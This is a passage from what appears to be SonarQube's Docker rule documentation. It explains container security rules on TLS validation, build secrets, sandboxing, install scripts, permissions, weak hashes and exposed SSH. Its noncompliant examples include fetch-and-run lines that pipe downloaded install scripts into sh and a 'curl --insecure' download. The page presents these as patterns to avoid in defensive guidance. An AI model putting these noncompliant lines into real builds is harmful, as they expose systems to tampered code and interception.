<ul><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S4830">
              docker:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. The role
of certificate validation in this process is to ensure that a system is indeed the one it claims to be, adding an extra layer of trust and
security.</p>
<p>When certificate validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
FROM ubuntu:22.04

# Noncompliant
RUN curl --insecure -O https://expired.example.com/downloads/install.sh
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
FROM ubuntu:22.04

RUN curl -O https://new.example.com/downloads/install.sh
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://cwe.mitre.org/data/definitions/295" rel="nofollow">MITRE, CWE-295</a> - Improper Certificate Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6469">
              docker:S6469
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Docker offers a feature to mount files and directories for specific <code>RUN</code> instructions when building Docker images. This feature can be
used to provide secrets to the commands that are executed during the build without baking them into the image. Additionally, it can be used to access
SSH agents during the build.</p>
<p>By using the <code>mode</code> option the permissions of the secrets or agents can be modified. By default, access is limited to the root user.</p>
<p>When such secrets are exposed with lax permissions, they might get compromised during the image build process. A successful compromise can only
happen during the execution of the command the <code>mount</code> option has been added to. While this might seem like a very hard exploitation
requirement, supply chain attacks, and other related threats, should still be considered.</p>
<p>If you are executing a command as a low-privileged user and need to access secrets or agents, you can use the options <code>uid</code> and
<code>gid</code> to provide access without having to resort to world-readable or writable permissions that might expose them to unintended
parties.</p>
<h3>Noncompliant code example</h3>
<pre>
RUN --mount&#61;type&#61;secret,id&#61;build_secret,mode&#61;0777 ./installer.sh # Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
RUN --mount&#61;type&#61;secret,id&#61;build_secret,uid&#61;1000 ./installer.sh
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://docs.docker.com/engine/reference/builder/#run---mounttypesecret" rel="nofollow">Dockerfile reference</a> - RUN --mount </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6502">
              docker:S6502
            </a>
          </td>
          <td>
            <details>
              <p>Disabling builder sandboxes can lead to unauthorized access of the host system by malicious programs.</p>
<p>By default, programs executed by a <code>RUN</code> statement use only a subset of <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" rel="nofollow">capabilities</a> which are considered safe: this is called <code>sandbox</code>
mode.</p>
<p>If you disable the sandbox with the <code>--security&#61;insecure</code> option, the executed command can use the full set of Linux capabilities.<br />
This can lead to a container escape. For example, an attacker with the <code>SYS_ADMIN</code> capability is able to mount devices from the host
system.</p>
<p>This vulnerability allows an attacker who controls the behavior of the ran command to access the host system, break out of the container and
penetrate the infrastructure.</p>
<p>After a successful intrusion, the underlying systems are exposed to:</p>
<ul><li> theft of intellectual property and/or personal data </li><li> extortion </li><li> denial of service </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The program is controlled by an external entity. </li><li> The program is part of a supply chain that could be a victim of a supply chain attack. </li></ul>
<p>There is a risk if you answered yes to either of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Whenever possible, the sandbox should stay enabled to reduce unnecessary risk. </li><li> If elevated capabilities are absolutely necessary, make sure to verify the integrity of the program before executing it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
# syntax&#61;docker/dockerfile:1-labs
FROM ubuntu:22.04
# Sensitive
RUN --security&#61;insecure ./example.sh
</pre>
<h2>Compliant Solution</h2>
<pre>
# syntax&#61;docker/dockerfile:1-labs
FROM ubuntu:22.04
RUN ./example.sh
RUN --security&#61;sandbox ./example.sh
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/250" rel="nofollow">MITRE, CWE-250</a> - Execution with Unnecessary Privileges </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://docs.docker.com/engine/reference/builder/#run---security" rel="nofollow">Dockerfile reference</a> - RUN </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6505">
              docker:S6505
            </a>
          </td>
          <td>
            <details>
              <p>When installing dependencies, package managers like <code>npm</code> will automatically execute shell scripts distributed along with the source
code. Post-install scripts, for example, are a common way to execute malicious code at install time whenever a package is compromised.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The execution of dependency installation scripts is required for the application to function correctly. </li></ul>
<p>There is a risk if you answered no to the question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Execution of third-party scripts should be disabled if not strictly necessary for dependencies to work correctly. Doing this will reduce the attack
surface and block a well-known supply chain attack vector.</p>
<h2>Sensitive Code Example</h2>
<pre>
FROM node:latest

# Sensitive
RUN npm install
</pre>
<pre>
FROM node:latest

# Sensitive
RUN yarn install
</pre>
<h2>Compliant Solution</h2>
<pre>
FROM node:latest

RUN npm install --ignore-scripts
</pre>
<pre>
FROM node:latest

RUN yarn install --ignore-scripts
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/506" rel="nofollow">MITRE, CWE-506</a> - Embedded Malicious Code </li><li> <a href="https://cwe.mitre.org/data/definitions/829" rel="nofollow">MITRE, CWE-829</a> - Inclusion of Functionality from Untrusted Control Sphere </li><li> <a href="https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes/" rel="nofollow">ESLint blog</a> - Postmortem for Malicious Packages
  Published on July 12th, 2018 </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6504">
              docker:S6504
            </a>
          </td>
          <td>
            <details>
              <p>Ownership of an executable has been assigned to a user other than root. More often than not, resource owners have write permissions and thus can
edit the resource.</p>
<p>Write permissions enable malicious actors, who got a foothold on the container, to tamper with the executable and thus manipulate the container’s
expected behavior.<br /> Manipulating executables could disrupt services or aid in escalating privileges inside the container.<br /></p>
<p>This breaches the container immutability principle as it facilitates container changes during its life. Immutability, a container best practice,
allows for a more reliable and reproducible behavior of Docker containers.</p>
<p>Resource ownership is not required; executables can be assigned execute permissions using <code>chmod</code> if needed.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> A non-root user has write permissions for the executable. </li></ul>
<p>There is a risk if you answered yes to the question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use <code>--chmod</code> to change executable permissions at build-time. </li><li> Be mindful of the container immutability principle. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
FROM example

RUN useradd exampleuser
# Sensitive
COPY --chown&#61;exampleuser:exampleuser src.py dst.py
</pre>
<h2>Compliant Solution</h2>
<pre>
FROM example

COPY src.py dst.py
</pre>
<h2>See</h2>
<ul><li> <a href="https://docs.docker.com/engine/reference/builder/#add" rel="nofollow">Dockerfile reference</a> - ADD instruction </li><li> <a href="https://docs.docker.com/engine/reference/builder/#copy" rel="nofollow">Dockerfile reference</a> - COPY instruction </li><li> <a href="https://cwe.mitre.org/data/definitions/732.html" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cloud.google.com/architecture/best-practices-for-operating-containers#immutability" rel="nofollow">Google Cloud, Immutability</a> - Best
  practices for operating containers </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S5332">
              docker:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul><li> sensitive data exposure </li><li> traffic redirected to a malicious endpoint </li><li> malware-infected software update or installer </li><li> execution of client-side code </li><li> corruption of critical information </li></ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul><li> bypassing isolation mechanisms </li><li> compromising a component of the network </li><li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li></ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http" rel="nofollow">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169" rel="nofollow">CVE-2019-6169</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327" rel="nofollow">CVE-2019-12327</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065" rel="nofollow">CVE-2019-11065</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application data needs to be protected against tampering or leaks when transiting over the network. </li><li> Application data transits over an untrusted network. </li><li> Compliance rules require the service to encrypt data in transit. </li><li> OS-level protections against clear-text traffic are deactivated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul><li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li><li> Use <code>https</code> instead of <code>http</code>. </li></ul>  </li></ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
RUN curl http://www.example.com/
</pre>
<h2>Compliant Solution</h2>
<pre>
RUN curl https://www.example.com/
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="nofollow">Google, Moving towards more secure web</a> </li><li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/" rel="nofollow">Mozilla, Deprecating non secure http</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6500">
              docker:S6500
            </a>
          </td>
          <td>
            <details>
              <p>Installing recommended packages automatically can lead to vulnerabilities in the Docker image.</p>
<p>Potentially unnecessary packages are installed via a known Debian package manager. These packages will increase the attack surface of the created
container as they might contain unidentified vulnerabilities or malicious code. Those packages could be used as part of a broader supply chain attack.
In general, the more packages are installed in a container, the weaker its security posture is.<br /> Depending on the introduced vulnerabilities, a
malicious actor accessing such a container could use these for privilege escalation.<br /> Removing unused packages can also significantly reduce your
Docker image size.</p>
<p>To be secure, remove unused packages where possible and ensure images are subject to routine vulnerability scans.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Container vulnerability scans are not performed. </li></ul>
<p>There is a risk if you answered yes to the question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Avoid installing package dependencies that are not strictly required. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
FROM debian:latest

# Sensitive
RUN apt install -y build-essential

# Sensitive
RUN apt-get install -y build-essential

# Sensitive
RUN aptitude install -y build-essential
</pre>
<h2>Compliant Solution</h2>
<pre>
FROM debian:latest

RUN apt install -y --no-install-recommends build-essential

RUN apt-get install -y --no-install-recommends build-essential

RUN aptitude install -y --without-recommends build-essential
</pre>
<h2>See</h2>
<ul><li> <a href="https://www.debian.org/doc/debian-policy/ch-relationships.html" rel="nofollow">Debian Documentation</a> - Binary Dependencies </li><li> <a href="https://ubuntu.com/blog/we-reduced-our-docker-images-by-60-with-no-install-recommends" rel="nofollow">Ubuntu Blog</a> - Container size reduction
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6506">
              docker:S6506
            </a>
          </td>
          <td>
            <details>
              <p>The usage of HTTPS is not enforced here. As it is possible for the HTTP client to follow redirects, such redirects might lead to websites using
HTTP.</p>
<p>As HTTP is a clear-text protocol, it is considered insecure. Due to its lack of encryption, attackers that are able to sniff traffic from the
network can read, modify, or corrupt the transported content. Therefore, allowing redirects to HTTP can lead to several risks:</p>
<ul><li> Exposure of sensitive data </li><li> Malware-infected software updates or installers </li><li> Corruption of critical information </li></ul>
<p>Even in isolated networks, such as segmented cloud or offline environments, it is important to ensure the usage of HTTPS. If not, then insider
threats with access to these environments might still be able to monitor or tamper with communications.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> It is possible for the requested resource to be redirected to an insecure location in the future. </li></ul>
<p>There is a risk if you answered yes to the question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Ensure that the HTTP client only accepts HTTPS pages. In <code>curl</code> this can be enabled using the option <code>--proto &#34;&#61;https&#34;</code>.
  </li><li> If it is not necessary to follow HTTP redirects, disable this in the HTTP client. In <code>curl</code> this is done by omitting the
  <code>-L</code> or <code>--location</code> option. In <code>wget</code> this is done by adding the option <code>--max-redirect&#61;0</code>. </li></ul>
<h2>Sensitive Code Example</h2>
<p>In the examples below, an install script is downloaded using <code>curl</code> or <code>wget</code> and then executed.</p>
<p>While connections made using HTTPS are generally considered secure, <code>https://might-redirect.example.com/install.sh</code> might redirect to a
location that uses HTTP. Downloads made using HTTP are not secure and can be intercepted and modified. An attacker could modify the install script to
run malicious code inside the container.</p>
<p><code>curl</code> will not follow redirects unless either <code>-L</code> or <code>--location</code> option is used.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
FROM ubuntu:22.04

# Sensitive
RUN curl --tlsv1.2 -sSf -L https://might-redirect.example.com/install.sh | sh
</pre>
<p><code>wget</code> will follow redirects by default.</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
FROM ubuntu:22.04

# Sensitive
RUN wget --secure-protocol&#61;TLSv1_2 -q -O - https://might-redirect.example.com/install.sh | sh
</pre>
<h2>Compliant Solution</h2>
<p>If you expect the server to redirect the download to a new location, <code>curl</code> can use the option <code>--proto &#34;&#61;https&#34;</code> to ensure
requests are only made using HTTPS. Any attempt to redirect to a location using HTTP will result in an error.</p>
<pre data-diff-id="1" data-diff-type="compliant">
FROM ubuntu:22.04

RUN curl --proto &#34;&#61;https&#34; --tlsv1.2 -sSf -L https://might-redirect.example.com/install.sh | sh
</pre>
<p><code>wget</code> does not support this functionality so <code>curl</code> should be used instead.</p>
<p>If you expect the server to return the file without redirects, <code>curl</code> should not be instructed to follow redirects. Remove any
<code>-L</code> or <code>--location</code> options from the command.</p>
<pre data-diff-id="1" data-diff-type="compliant">
FROM ubuntu:22.04

RUN curl --tlsv1.2 -sSf https://might-redirect.example.com/install.sh | sh
</pre>
<p><code>wget</code> uses the option <code>--max-redirect&#61;0</code> to disable redirects.</p>
<pre data-diff-id="2" data-diff-type="compliant">
FROM ubuntu:22.04

RUN wget --secure-protocol&#61;TLSv1_2 --max-redirect&#61;0 -q -O - https://might-redirect.example.com/install.sh | sh
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/757" rel="nofollow">MITRE, CWE-757</a> - Selection of Less-Secure Algorithm During Negotiation (&#39;Algorithm
  Downgrade&#39;) </li><li> <a href="https://curl.se/docs/manpage.html#--proto" rel="nofollow">curl.1 the man page</a> - <code>--proto &lt;protocols&gt;</code> </li><li> <a href="https://linux.die.net/man/1/wget" rel="nofollow">wget(1) - Linux man page</a> - <code>--max-redirect&#61;</code> </li><li> <a href="https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices#41-encrypt-everything" rel="nofollow">SSL and TLS Deployment Best
  Practices</a> - Encrypt Everything </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S2612">
              docker:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the &#34;<code>others</code>&#34; category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The container is designed to be a multi-user environment. </li><li> Services are run by dedicated low-privileged users to achieve privileges separation. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<p>To be secure, remove the unnecessary permissions. If required, use <code>--chown</code> to set the target user and group.</p>
<h2>Sensitive Code Example</h2>
<pre>
# Sensitive
ADD --chmod&#61;777 src dst
# Sensitive
COPY --chmod&#61;777 src dst
# Sensitive
RUN chmod &#43;x resource
# Sensitive
RUN chmod u&#43;s resource
</pre>
<h2>Compliant Solution</h2>
<pre>
ADD --chmod&#61;754 src dst
COPY --chown&#61;user:user --chmod&#61;744 src dst
RUN chmod u&#43;x resource
RUN chmod &#43;t resource
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://docs.docker.com/engine/reference/builder/#add" rel="nofollow">ADD</a> - Docker ADD command </li><li> <a href="https://docs.docker.com/engine/reference/builder/#copy" rel="nofollow">COPY</a> - Docker COPY command </li><li> <a href="https://man.archlinux.org/man/core/man-pages/chmod.1p.en" rel="nofollow">chmod reference</a> - <code>chmod</code> command </li><li> <a href="https://man.archlinux.org/man/chown.1.en" rel="nofollow">chown reference</a> - <code>chown</code> command </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S4507">
              docker:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li><li> The application runs by default with debug features activated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers or applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<pre>
FROM example
# Sensitive
ENV APP_DEBUG&#61;true
# Sensitive
ENV ENV&#61;development
CMD /run.sh
</pre>
<h2>Compliant Solution</h2>
<pre>
FROM example
ENV APP_DEBUG&#61;false
ENV ENV&#61;production
CMD /run.sh
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li><li> <a href="https://cwe.mitre.org/data/definitions/215" rel="nofollow">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S4790">
              docker:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
FROM ubuntu:22.04

# Sensitive
RUN echo &#34;a40216e7c028e7d77f1aec22d2bbd5f9a357016f  go1.20.linux-amd64.tar.gz&#34; | sha1sum -c
RUN tar -C /usr/local -xzf go1.20.linux-amd64.tar.gz
ENV PATH&#61;&#34;$PATH:/usr/local/go/bin&#34;
</pre>
<h2>Compliant Solution</h2>
<pre>
FROM ubuntu:22.04

RUN echo &#34;5a9ebcc65c1cce56e0d2dc616aff4c4cedcfbda8cc6f0288cc08cda3b18dcbf1  go1.20.linux-amd64.tar.gz&#34; | sha256sum -c
RUN tar -C /usr/local -xzf go1.20.linux-amd64.tar.gz
ENV PATH&#61;&#34;$PATH:/usr/local/go/bin&#34;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6473">
              docker:S6473
            </a>
          </td>
          <td>
            <details>
              <p>Exposing administration services can lead to unauthorized access of containers or escalation of privileges inside of containers.</p>
<p>A port that is commonly used for administration services is marked as being open through the <code>EXPOSE</code> command. Administration services
like SSH might contain vulnerabilities, hard-coded credentials, or other security issues that increase the attack surface of a Docker deployment.<br />
Even if the ports of the services do not get forwarded to the host system, by default they are reachable from other containers in the same network. A
malicious actor that gets access to one container could use such services to escalate access and privileges.</p>
<p>Removing the <code>EXPOSE</code> command is not sufficient to be secure. The port is still open and the service accessible. To be secure, no
administration services should be started. Instead, try to access the required information from the host system. For example, if the administration
service is included to access logs or debug a service, you can do this from the host system instead. Docker allows you to read out any file that is
inside of a container and to spawn a shell inside of a container if necessary.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The container starts an administration service. </li></ul>
<p>There is a risk if you answered yes to the question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Do not start SSH, VNC, RDP or similar administration services in containers. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
FROM ubuntu:22.04
# Sensitive
EXPOSE 22
CMD [&#34;/usr/sbin/sshd&#34;, &#34;-f&#34;, &#34;/etc/ssh/sshd_config&#34;, &#34;-D&#34;]
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://docs.docker.com/engine/reference/builder/#expose" rel="nofollow">Dockerfile reference</a> - EXPOSE </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6472">
              docker:S6472
            </a>
          </td>
          <td>
            <details>
              <p>Using <code>ENV</code> and <code>ARG</code> to handle secrets can lead to sensitive information being disclosed to an inappropriate sphere.</p>
<p>The <code>ARG</code> and <code>ENV</code> instructions in a Dockerfile are used to configure the image build and the container environment
respectively. Both can be used at image build time, during the execution of commands in the container, and <code>ENV</code> can also be used at
